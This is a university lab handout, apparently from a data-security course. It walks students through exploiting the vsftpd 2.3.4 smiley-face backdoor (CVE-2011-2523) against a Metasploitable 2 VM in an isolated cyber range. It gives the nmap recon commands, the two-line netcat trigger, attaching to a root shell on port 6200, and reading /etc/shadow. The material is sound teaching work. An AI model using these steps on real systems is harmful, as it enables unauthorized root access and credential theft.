Your first exploit

Form a team. Connect to the cyber range. Pop a root shell with a smiley face.

Lab 00 is orientation. By the end of class you will have stood up a root shell on a remote machine — twice — without writing any code, using a famous one-byte trigger in vsftpd 2.3.4.

The goal of DS 6042 is to teach the tools, techniques, and mental models you need to build and deploy secure data pipelines and AI systems. The course starts on the attacker's side, though: before you can reason about defending a system, you should know what it feels like to break one — which tools attackers reach for, which assumptions they exploit, and the mental model behind a real intrusion. Lab 0 is your first hour in that seat.

In July 2011 the official vsftpd download server was compromised: the maintainer's release tarball was briefly replaced with a backdoored copy. Anyone who logged in with a username ending in :) — a literal smiley face — tripped a hidden code path that forked /bin/sh and bound it to TCP port 6200. The poisoned binary was caught within days, but it lives on inside Metasploitable 2, the deliberately vulnerable Linux VM the security community uses for teaching. You will fire it three different ways today.

CVE-2011-2523 · post-mortem on the scarybeasts (vsftpd maintainer) blog · Metasploit module: vsftpd_234_backdoor.rb · target: Metasploitable 2.

An Overview of Tools and Targets

  • Target: Metasploitable 2 on a private subnet, no internet egress. The vulnerable service is vsftpd 2.3.4 on TCP/21.
  • Tools (pre-installed on the Kali VM): nmap, nc (netcat), msfconsole (Metasploit Framework).
  • Original CVE: CVE-2011-2523. Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor.

Authorized use - Read this carefully.

Everything you are about to do is illegal outside an authorized environment. The Virginia Cyber Range is authorized — it is a private, isolated cloud network provisioned specifically for educational use, with no path to the public internet. You may not run these tools against your laptop's wifi, your dorm network, your employer's network, AWS instances you happen to own, friends' machines, or anything else not assigned to this course. Port scanning alone can be a felony under the Computer Fraud and Abuse Act (18 U.S.C. § 1030). Stay in the sandbox.

2c · Save the target IP into a shell variable. Every command in the rest of this lab uses $TARGET instead of hard-coding the address. That way you can copy-paste examples without editing them — and so can your teammate.

10.0.0.6

export places the variable into the shell's environment so child processes (like nc, nmap, and msfconsole) inherit it. If echo $TARGET prints your target IP back, you're good. Write the IP in your shared team notes so your teammate has it too.

Try it · subnet math

Your Kali instance is on 10.0.0.5/24. How many addresses does that subnet contain? Two of those addresses are conventionally reserved for non-host use — which two, and what are they used for?

Show answer
The /24 means the first 24 of 32 IP bits are fixed; the remaining 8 are free. That's 28 = 256 addresses, 10.0.0.0 through 10.0.0.255. Two are reserved: 10.0.0.0 is the network address (refers to the subnet itself; never assigned to a host), and 10.0.0.255 is the broadcast address (a packet to this address is delivered to every host on the subnet). The remaining 254 are assignable to actual hosts — yours is .5, the gateway is .1, the target is .6.

3 · Reconnaissance — identify the service ~30 min

You have a target IP. You don't yet know what's running on it. Real enumeration follows a fixed pattern: scan ports → identify services → identify versions → look up vulnerabilities for those versions. Today we do all four.

3.1 Find open ports

sudo nmap -p- $TARGET

-p- scans all 65,535 TCP ports (the default is the top 1,000 — fast, but the real world doesn't always cooperate). The full scan takes ~1–2 minutes against Metasploitable, which deliberately runs many vulnerable services. Your output will look something like this (truncated):

3.2 Identify the service version

sudo nmap -sV -p 21 $TARGET

-sV is service-version detection: Nmap connects to each port, reads the banner that the service sends back, and matches it against its fingerprint database. You should see this:

The version string vsftpd 2.3.4 is the smoking gun. That specific release has a famous, easy-to-trigger backdoor — which is why we picked it for the first lab.

3.3 Confirm the banner with your own eyes

You don't have to trust Nmap. Connect to the FTP service with nc (netcat, the swiss-army-knife TCP client):

nc $TARGET 21
# 220 (vsFTPd 2.3.4)        ← server greeting
QUIT
# 221 Goodbye.

220 is the FTP "service ready" reply code. The parenthesized string is exactly what nmap -sV was reading.

4 · FTP in 60 seconds

FTP (File Transfer Protocol) is a plaintext, line-oriented protocol from 1971. The client sends ASCII commands one per line; the server replies with a three-digit code plus a human-readable message.

a normal FTP login · client ↔ server
Each row is one line on the wire. Three-digit codes are responses; everything else is commands. 1xx = positive preliminary, 2xx = positive completion, 3xx = needs more input, 4xx/5xx = failure.
directionlinemeaning
← server220 (vsFTPd 2.3.4)service ready, banner
→ clientUSER alice"I want to log in as alice"
← server331 Please specify the password.username known, need password
→ clientPASS hunter2password
← server230 Login successful.authenticated
→ clientQUITclose session
← server221 Goodbye.session closed

The entire attack is two of these lines: a crafted USER and any PASS. No real authentication happens — read on.

Try it · reading response codes

Suppose you sent USER alice and the server replied with 230 Login successful. instead of 331 Please specify the password.. What does that tell you about the server's configuration — and why might it matter to a security audit?

Show answer
The server accepted the login without a password. Two ways that can happen in real FTP servers: anonymous FTP is enabled (an anonymous or ftp account is mapped to a guest directory and accepts any password including none), or the account has no password set. Either is a significant audit finding. Anonymous FTP made sense in 1985 for sharing public files; in 2026 most production servers should require authentication, and a server that accepts unauthenticated logins is leaking either configuration (it's intentional and may be fine) or a credential-management failure (it's accidental and is not fine).

5 · The smiley trigger

In vsftpd 2.3.4, the attacker who included :) at the end of the USER argument tripped a hidden branch that forked /bin/sh and bound it to TCP port 6200. The author of the malicious code is unknown — it was injected by whoever compromised the download server. Stripped to its essence, the poisoned source did something like this:

/* str.c, hostile addition — vsftpd-2.3.4 backdoored tarball */
if (p_str->p_buf[i] == 0x3a    /* ':' */
 && p_str->p_buf[i+1] == 0x29) /* ')' */
{
    vsf_sysutil_extra();        /* fork /bin/sh, bind :6200 */
}

The check happens before authentication, so the PASS you send doesn't matter — but you still have to send one to keep the protocol state machine happy.

click a username · watch the server's branch
Pick a username. The flowchart on the right shows which path the backdoored vsftpd takes when it processes the USER command. Only the highlighted path runs.
USER <name>
Pick a username on the left.

The substring check happens anywhere in the username, not just at the end — alice:)bob trips it too. The check happens before vsftpd ever looks at the password file.

Try it · read the code, trace each username

Here's a Python equivalent of the vsftpd 2.3.4 backdoor check — the C snippet in §5 above with the surrounding loop made explicit:

def trips_backdoor(username: str) -> bool:
    """Return True if the username would trip the vsftpd 2.3.4 backdoor."""
    for i in range(len(username) - 1):
        if username[i] == ':' and username[i + 1] == ')':
            return True
    return False

For each username below, trace the loop in your head: what does trips_backdoor return? If True, at what value of i? Don't peek at the answer until you've decided on all six.

  1. hacker
  2. hacker:)
  3. alice:)bob
  4. :)
  5. bob:
  6. :)alice:)
Show answer

The loop tests, at every position i, whether username[i] == ':' AND username[i+1] == ')'. As soon as both are true, the function returns. Tracing each:

  1. hacker — no : anywhere; loop completes; returns False.
  2. hacker:) — at i=6 we have ':' and username[7] is ')'; returns True at i=6.
  3. alice:)bob — at i=5 we have ':' and username[6] is ')'; returns True at i=5. The function exits before reading bob.
  4. :) — at i=0 we have ':' and username[1] is ')'; returns True at i=0.
  5. bob: — the trailing ':' is at index 3, but the loop bound is range(len-1) = range(3) → i ∈ {0, 1, 2}. We never test index 3. Returns False — and notice why: the implementation safely avoids reading past the end of the string by stopping early.
  6. :)alice:) — at i=0 we already have a smiley; returns True at i=0. The second smiley at the end is never reached.

The lesson: substring matches are not "starts with" or "ends with" — the trigger fires the first time the byte pair appears, anywhere in the input. The off-by-one in case (5) is worth noticing — the loop bound is the reason a lone trailing colon doesn't crash the server reading past the buffer. Real production code has to handle this kind of edge case deliberately, even (especially) when the code is malicious.

6 · Manual exploitation ~30 min

Now you do it for real. Open two terminal tabs on Kali — the same way the Try-it widget has two — and follow along.

what's about to happen on the wire
Two TCP connections from Kali to Metasploitable. The first one (port 21) arms the backdoor. The second one (port 6200) attaches to the resulting root shell.

6.1 Terminal A · arm the backdoor

nc $TARGET 21
# 220 (vsFTPd 2.3.4)
USER hacker:)
# 331 Please specify the password.
PASS whatever
# <no response — server has forked the shell>

The server appears to hang — it never returns a 230 Login successful because the backdoor short-circuited the login handler. Leave this terminal open. Do not press Ctrl+C; that closes the FTP connection and tears the backdoor shell down with it.

6.2 Terminal B · attach to the shell

nc $TARGET 6200
id
# uid=0(root) gid=0(root)
whoami
# root

The remote shell has no prompt and no welcome message. It looks like nothing happened. Type a command and press Enter — output appears. You are root on the target.

6.3 Confirm what root buys you

hostname             # metasploitable
uname -a             # Linux metasploitable 2.6.24-16-server ...
cat /etc/shadow      # password hashes, normally root-only
ls /root             # root's home directory
exit                 # close the shell

/etc/shadow is normally readable only by root because it contains password hashes. You can read it. That is the entire promise of the exploit: arbitrary code execution as the highest-privilege user on the machine, before authentication, in two lines.

Try it · why two terminals?

The exploit needs two nc connections — one to port 21 and another to port 6200. What's the role of each? What would happen if you tried to do both from a single nc session?

Show answer
The first nc session (port 21) delivers the trigger: USER ...:) + PASS .... vsftpd reacts by forking /bin/sh and binding it to port 6200 — but that shell is its own process, listening on a different port. The second nc session (port 6200) attaches to that shell so you can type commands into it. A single nc session can only talk to one port at a time; it can't simultaneously be the FTP client AND the shell client. Two listeners → two connections → two terminals.

FAQ

The Try-it widget worked; do I still have to do it inside the cyber range?

Yes. The widget is a simulation — it teaches the keystrokes. The graded artifacts come from the real Kali ↔ Metasploitable exchange in VCR.

The smiley trigger seems trivial. Has anything that simple ever shipped in real software since 2011?

Yes, and often. The XZ-Utils backdoor (CVE-2024-3094, 2024) was a far more sophisticated supply-chain compromise, but at its core it was the same shape: hostile code added to a trusted upstream, triggered by a magic byte sequence, granting pre-auth remote access. The delivery got harder; the idea didn't.

Why netcat instead of an FTP client?

Because FTP clients normalize input. An FTP client would refuse to send USER hacker:) verbatim, or would sanitize the colon, or would helpfully add a : for you. nc sends the bytes you typed. For exploitation work, you almost always want a raw TCP client — nc, ncat, socat, or your own Python socket script — not a protocol-aware client.

I want to see the actual Metasploit module source.

On Kali, cat /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb. It's about 40 lines of Ruby — read it line by line and compare to what you did by hand in section 6.
